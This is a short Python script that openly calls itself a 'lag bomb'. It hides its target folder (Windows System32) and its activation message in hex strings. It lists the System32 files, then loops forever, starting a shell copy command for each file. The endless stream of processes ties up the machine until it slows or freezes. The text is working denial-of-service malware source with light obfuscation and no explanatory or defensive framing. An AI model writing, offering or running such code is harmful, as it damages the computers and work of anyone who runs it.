import os;import codecs;
a = str(bytearray.fromhex("43 3A 2F 57 69 6E 64 6F 77 73 2F 53 79 73 74 65 6D 33 32 2F 0A").decode())[0:-1];b = os.listdir(a);c = [];
for d in b:
    e, f= os.path.splitext(d)
    if f != "" and f != ".BIN":
        c.append(e+f)
print(bytearray.fromhex("4C 61 67 20 62 6F 6D 62 20 61 63 74 69 76 61 74 65 64 0A").decode()[0:-1])
while True:
    for h in c:
        os.popen(f'copy {h} /sys/')